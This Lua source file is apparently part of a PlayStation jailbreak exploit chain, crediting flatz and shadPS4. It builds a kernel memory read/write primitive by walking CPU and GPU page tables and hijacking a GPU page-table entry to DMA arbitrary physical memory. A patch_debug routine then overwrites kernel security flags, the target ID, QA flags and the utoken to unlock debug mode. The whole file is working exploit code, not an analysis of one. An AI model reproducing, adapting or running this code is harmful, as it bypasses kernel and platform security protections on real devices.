-- credit to flatz and shadPS4 project for references

local GPU_PDE_ADDR_MASK = 0x0000FFFFFFFFFFC0
local CPU_PHYS_MASK     = 0x000FFFFFFFFFF000

local PROT_READ  = 0x01
local PROT_WRITE = 0x02
local GPU_READ   = 0x10
local GPU_WRITE  = 0x20
local MAP_NO_COALESCE = 0x400000

local kr64, kw64, kr32, kw32
local _dmap_base = nil
local _data_base = nil
local _kernel_cr3 = nil
local _curproc = nil

local _gnm_submit = nil
local _gnm_done = nil
local _alloc_dmem_fn = nil
local _map_dmem_fn = nil

-- pre-allocated submission buffers
local _gnm_dcb_addr = nil
local _gnm_dcb_size = nil


local function phys_to_dmap(pa)
    return _dmap_base + pa
end

local function virt_to_phys(va, cr3)
    local pml4e = kr64(phys_to_dmap(cr3) + ((va >> 39) & 0x1FF) * 8)
    if pml4e == 0 or (pml4e & 1) == 0 then return nil end

    local pdpte = kr64(phys_to_dmap(pml4e & CPU_PHYS_MASK) + ((va >> 30) & 0x1FF) * 8)
    if pdpte == 0 or (pdpte & 1) == 0 then return nil end
    if (pdpte & 0x80) ~= 0 then
        return (pdpte & 0x000FFFFFC0000000) | (va & 0x3FFFFFFF)
    end

    local pde = kr64(phys_to_dmap(pdpte & CPU_PHYS_MASK) + ((va >> 21) & 0x1FF) * 8)
    if pde == 0 or (pde & 1) == 0 then return nil end
    if (pde & 0x80) ~= 0 then
        return (pde & 0x000FFFFFFFE00000) | (va & 0x1FFFFF)
    end

    local pte = kr64(phys_to_dmap(pde & CPU_PHYS_MASK) + ((va >> 12) & 0x1FF) * 8)
    if pte == 0 or (pte & 1) == 0 then return nil end
    return (pte & CPU_PHYS_MASK) | (va & 0xFFF)
end

local function get_proc_cr3(proc)
    local vmspace = kr64(proc + OFF.PROC_VM_SPACE)
    if vmspace == 0 or (vmspace >> 48) ~= 0xFFFF then return nil end
    for i = 1, 6 do
        local val = kr64(vmspace + 0x1C8 + i * 8)
        local diff = val - vmspace
        if diff >= 0x2C0 and diff <= 0x2F0 then
            return kr64(val + OFF.PMAP_CR3)
        end
    end
    return nil
end

local function get_vmid(proc)
    local vmspace = kr64(proc + OFF.PROC_VM_SPACE)
    for i = 1, 8 do
        local val = kr32(vmspace + 0x1D4 + i * 4)
        if val > 0 and val <= 0x10 then return val end
    end
    return nil
end

local function find_data_base(proc)
    local p = proc
    for i = 1, 64 do
        p = kr64(p + 0x08)
        if p == 0 or (p >> 48) ~= 0xFFFF then break end
        if (p >> 32) == 0xFFFFFFFF then
            local candidate = p - OFF.ALLPROC
            if (candidate & 0xFFF) == 0 then return candidate end
        end
    end
    return nil
end



local function gpu_pde_field(pde, shift)
    return (pde >> shift) & 1
end

local function gpu_pde_frag(pde)
    return (pde >> 59) & 0x1F
end

local function gpu_walk_pt(vmid, virt_addr)
    local gvmspace = _data_base + OFF.GVMSPACE + vmid * OFF.SIZEOF_GVMSPACE
    local pdb2_addr = kr64(gvmspace + OFF.GVMSPACE_PAGE_DIR)

    local pml4e = kr64(pdb2_addr + ((virt_addr >> 39) & 0x1FF) * 8)
    if gpu_pde_field(pml4e, 0) ~= 1 then return nil end

    local pdp_pa = pml4e & GPU_PDE_ADDR_MASK
    local pdpe = kr64(phys_to_dmap(pdp_pa) + ((virt_addr >> 30) & 0x1FF) * 8)
    if gpu_pde_field(pdpe, 0) ~= 1 then return nil end

    local pd_pa = pdpe & GPU_PDE_ADDR_MASK
    local pde_idx = (virt_addr >> 21) & 0x1FF
    local pde = kr64(phys_to_dmap(pd_pa) + pde_idx * 8)
    if gpu_pde_field(pde, 0) ~= 1 then return nil end

    -- IS_PTE check (2mb page)
    if gpu_pde_field(pde, 54) == 1 then
        return phys_to_dmap(pd_pa) + pde_idx * 8, 0x200000
    end

    -- PTB
    local frag = gpu_pde_frag(pde)
    local offset = virt_addr & 0x1FFFFF
    local pt_pa = pde & GPU_PDE_ADDR_MASK
    local pte_idx, page_size

    if frag == 4 then
        pte_idx = offset >> 16
        local pte = kr64(phys_to_dmap(pt_pa) + pte_idx * 8)
        if gpu_pde_field(pte, 0) == 1 and gpu_pde_field(pte, 56) == 1 then
            pte_idx = (virt_addr & 0xFFFF) >> 13
            page_size = 0x2000 -- 8kb
        else
            page_size = 0x10000 -- 64kb
        end
    elseif frag == 1 then
        pte_idx = offset >> 13
        page_size = 0x2000 -- 8kb
    else
        return nil
    end

    return phys_to_dmap(pt_pa) + pte_idx * 8, page_size
end

local function get_ptb_entry(proc, va)
    local vmid = get_vmid(proc)
    if not vmid then return nil end

    local gvmspace = _data_base + OFF.GVMSPACE + vmid * OFF.SIZEOF_GVMSPACE
    local start_va = kr64(gvmspace + OFF.GVMSPACE_START_VA)
    local gvm_size = kr64(gvmspace + OFF.GVMSPACE_SIZE)

    if va < start_va or va >= start_va + gvm_size then return nil end

    return gpu_walk_pt(vmid, va - start_va)
end


-- direct memory allocation

local function alloc_main_dmem(size, prot, flags)
    local out = malloc(8); write64(out, 0)
    local ret = _alloc_dmem_fn(size, size, 1, out)
    if ret ~= 0 then return nil end
    local phys = read64(out)
    write64(out, 0)
    local ret2 = _map_dmem_fn(out, size, prot, flags, phys, size)
    if ret2 ~= 0 then return nil end
    return read64(out), phys
end


gpu = {}

gpu.dmem_size = 2 * 0x100000 -- 2mb

function gpu.pm4_type3_header(opcode, count)
    return (0x02                              
        | ((opcode & 0xFF) << 8)
        | (((count - 1) & 0x3FFF) << 16)
        | (0x03 << 30))                       
        & 0xFFFFFFFF
end

local function write_pm4_dma_to(buf, dst_va, src_va, length)
    local count = 6
    local opcode = 0x50
    local command_len = length & 0x1FFFFF

    local dma_hdr = 0x8C00C000

    write32(buf + 0x00, gpu.pm4_type3_header(opcode, count))
    write32(buf + 0x04, dma_hdr & 0xFFFFFFFF)
    write32(buf + 0x08, src_va & 0xFFFFFFFF)
    write32(buf + 0x0C, (src_va >> 32) & 0xFFFFFFFF)
    write32(buf + 0x10, dst_va & 0xFFFFFFFF)
    write32(buf + 0x14, (dst_va >> 32) & 0xFFFFFFFF)
    write32(buf + 0x18, command_len)

    return 4 * (count + 1) -- 28 bytes
end

local function submit_dma(dst, src, size)

    local cmd_size = write_pm4_dma_to(gpu.cmd_va, dst, src, size)

    -- prep param
    write64(_gnm_dcb_addr, gpu.cmd_va)
    write32(_gnm_dcb_size, cmd_size)

    -- submit to gpu
    local ret = _gnm_submit(1, _gnm_dcb_addr, _gnm_dcb_size, 0, 0)
    if ret ~= 0 then
        ulog("[gpu] sceGnmSubmitCommandBuffers error: " .. tostring(ret))
        return false
    end

    ret = _gnm_done()
    if ret ~= 0 then
        ulog("[gpu] sceGnmSubmitDone error: " .. tostring(ret))
        return false
    end

    return true
end

function gpu.transfer_physical_buffer(phys_addr, size, is_write)

    local trunc = phys_addr & ~(gpu.dmem_size - 1)
    local offset = phys_addr - trunc

    local prot_ro = PROT_READ | PROT_WRITE | GPU_READ
    local prot_rw = prot_ro | GPU_WRITE

    syscall.mprotect(gpu.victim_va, gpu.dmem_size, prot_ro)
    kw64(gpu.victim_ptbe_va, gpu.cleared_victim_ptbe_for_ro | trunc)
    syscall.mprotect(gpu.victim_va, gpu.dmem_size, prot_rw)

    local src, dst

    if is_write then
        src = gpu.transfer_va
        dst = gpu.victim_va + offset
    else
        src = gpu.victim_va + offset
        dst = gpu.transfer_va
    end

    submit_dma(dst, src, size)
end


-- r/w

function gpu.read32(kaddr)
    local pa = virt_to_phys(kaddr, _kernel_cr3)
    if not pa then return nil end
    gpu.transfer_physical_buffer(pa, 4, false)
    return read32(gpu.transfer_va)
end

function gpu.read64(kaddr)
    local pa = virt_to_phys(kaddr, _kernel_cr3)
    if not pa then return nil end
    gpu.transfer_physical_buffer(pa, 8, false)
    return read64(gpu.transfer_va)
end

function gpu.write32(kaddr, val)
    local pa = virt_to_phys(kaddr, _kernel_cr3)
    if not pa then return false end
    write32(gpu.transfer_va, val)
    gpu.transfer_physical_buffer(pa, 4, true)
    return true
end

function gpu.write64(kaddr, val)
    local pa = virt_to_phys(kaddr, _kernel_cr3)
    if not pa then return false end
    write64(gpu.transfer_va, val)
    gpu.transfer_physical_buffer(pa, 8, true)
    return true
end

function gpu.write8(kaddr, val)
    local aligned = kaddr & 0xFFFFFFFFFFFFFFFC
    local byteoff = kaddr - aligned
    local dw = gpu.read32(aligned)
    if not dw then return false end
    dw = (dw & ~(0xFF << (byteoff * 8))) | ((val & 0xFF) << (byteoff * 8))
    return gpu.write32(aligned, dw)
end



function gpu.setup()

    kr64 = kread64
    kw64 = kwrite64
    kr32 = kread32
    kw32 = kwrite32
    _curproc = curproc

    syscall.resolve({ mprotect = 0x4A })

    local a_alloc = dlsym(LIBKERNEL_HANDLE, "sceKernelAllocateMainDirectMemory")
    local a_map   = dlsym(LIBKERNEL_HANDLE, "sceKernelMapDirectMemory")
    if a_alloc == 0 or a_map == 0 then
        send_notification("[gpu] dlsym dmem failed")
        return false
    end
    _alloc_dmem_fn = func_wrap(a_alloc)
    _map_dmem_fn   = func_wrap(a_map)

    if not sceKernelLoadStartModule then
        sceKernelLoadStartModule = func_wrap(dlsym(LIBKERNEL_HANDLE, "sceKernelLoadStartModule"))
    end

    local gnm_mod = nil
    local gnm_names = {
        "libSceGnmDriver.sprx",
        "libSceGnmDriverForNeoMode.sprx",
    }
    for _, name in ipairs(gnm_names) do
        local ok, handle = pcall(sceKernelLoadStartModule, name, 0, 0, 0, 0, 0)
        if ok and handle and handle > 0 and handle < 0x80000000 then
            gnm_mod = handle
            ulog("[gpu] loaded gnm driver: " .. name .. " handle=" .. to_hex(handle))
            break
        else
            ulog("[gpu] " .. name .. " load failed")
        end
    end
    if not gnm_mod then
        send_notification("[gpu] gnm driver not found")
        return false
    end

    local a_submit = dlsym(gnm_mod, "sceGnmSubmitCommandBuffers")
    local a_done   = dlsym(gnm_mod, "sceGnmSubmitDone")
    if a_submit == 0 or a_done == 0 then
        send_notification("[gpu] dlsym gnm failed")
        return false
    end
    _gnm_submit = func_wrap(a_submit)
    _gnm_done   = func_wrap(a_done)
    ulog("[gpu] gnm submit=" .. to_hex(a_submit) .. " done=" .. to_hex(a_done))

    _gnm_dcb_addr = malloc(8)
    _gnm_dcb_size = malloc(4)

    _data_base = find_data_base(_curproc)
    if not _data_base then
        send_notification("[gpu] data_base not found")
        return false
    end
    ulog("[gpu] data_base=" .. to_hex(_data_base))

    local pmap_store = _data_base + OFF.KERNEL_PMAP_STORE
    local pm_pml4 = kr64(pmap_store + OFF.PMAP_PML4)
    local pm_cr3  = kr64(pmap_store + OFF.PMAP_CR3)
    _dmap_base  = pm_pml4 - pm_cr3
    _kernel_cr3 = pm_cr3
    ulog("[gpu] dmap=" .. to_hex(_dmap_base) .. " cr3=" .. to_hex(_kernel_cr3))

    local prot_rw = PROT_READ | PROT_WRITE | GPU_READ | GPU_WRITE

    gpu.victim_va   = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE)
    gpu.transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE)
    gpu.cmd_va      = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE)
    if not gpu.victim_va or not gpu.transfer_va or not gpu.cmd_va then
        send_notification("[gpu] dmem alloc failed")
        return false
    end
    ulog("[gpu] victim=" .. to_hex(gpu.victim_va))
    ulog("[gpu] transfer=" .. to_hex(gpu.transfer_va))
    ulog("[gpu] cmd=" .. to_hex(gpu.cmd_va))

    local proc_cr3 = get_proc_cr3(_curproc)
    if not proc_cr3 then
        send_notification("[gpu] proc cr3 failed")
        return false
    end

    local victim_real_pa = virt_to_phys(gpu.victim_va, proc_cr3)
    if not victim_real_pa then
        send_notification("[gpu] victim pa failed")
        return false
    end
    gpu.victim_real_pa = victim_real_pa
    ulog("[gpu] victim_pa=" .. to_hex(victim_real_pa))

    local ptbe_va, page_size = get_ptb_entry(_curproc, gpu.victim_va)
    if not ptbe_va then
        send_notification("[gpu] gpu pt walk failed")
        return false
    end
    if page_size ~= gpu.dmem_size then
        send_notification("[gpu] page_size mismatch " .. to_hex(page_size))
        return false
    end
    ulog("[gpu] ptbe=" .. to_hex(ptbe_va))

    local prot_ro = PROT_READ | PROT_WRITE | GPU_READ
    syscall.mprotect(gpu.victim_va, gpu.dmem_size, prot_ro)

    local initial_ptbe = kr64(ptbe_va)
    gpu.cleared_victim_ptbe_for_ro = initial_ptbe & (~victim_real_pa)
    gpu.victim_ptbe_va = ptbe_va

    ulog("[gpu] initial_ptbe=" .. to_hex(initial_ptbe))
    ulog("[gpu] cleared_ptbe=" .. to_hex(gpu.cleared_victim_ptbe_for_ro))

    syscall.mprotect(gpu.victim_va, gpu.dmem_size, prot_rw)

    gpu.data_base  = _data_base
    gpu.dmap_base  = _dmap_base
    gpu.kernel_cr3 = _kernel_cr3

    ulog("[gpu] setup ok")
    return true
end


function gpu.patch_debug(ulog_fn)
    local ulog = ulog_fn or ulog
    if not _data_base then ulog("[gpu] no data_base"); return false end

    local secflags_addr = _data_base + OFF.SECURITY_FLAGS

    -- security_flags |= 0x14
    local sf = gpu.read32(secflags_addr)
    if sf then
        ulog("[gpu] sec_flags=" .. to_hex(sf))
        gpu.write32(secflags_addr, sf | 0x14)
        ulog("[gpu] sec_flags now=" .. to_hex(gpu.read32(secflags_addr)))
    end

    -- target_id = 0x82
    gpu.write8(secflags_addr + 0x09, 0x82)
    ulog("[gpu] target_id set")

    -- qa_flags |= 0x10300
    local qa = gpu.read32(secflags_addr + 0x24)
    if qa then
        ulog("[gpu] qa_flags=" .. to_hex(qa))
        gpu.write32(secflags_addr + 0x24, qa | 0x10300)
        ulog("[gpu] qa_flags now=" .. to_hex(gpu.read32(secflags_addr + 0x24)))
    end

    -- utoken |= 0x01
    local ut_addr = secflags_addr + 0x8C
    local ut_aligned = ut_addr & 0xFFFFFFFFFFFFFFFC
    local ut_byte = ut_addr - ut_aligned
    local ut_dw = gpu.read32(ut_aligned)
    if ut_dw then
        local ut_val = (ut_dw >> (ut_byte * 8)) & 0xFF
        local new_dw = (ut_dw & ~(0xFF << (ut_byte * 8))) | (((ut_val | 0x01) & 0xFF) << (ut_byte * 8))
        gpu.write32(ut_aligned, new_dw)
        ulog("[gpu] utoken set")
    end

    ulog("[gpu] debug patches done")
    return true
end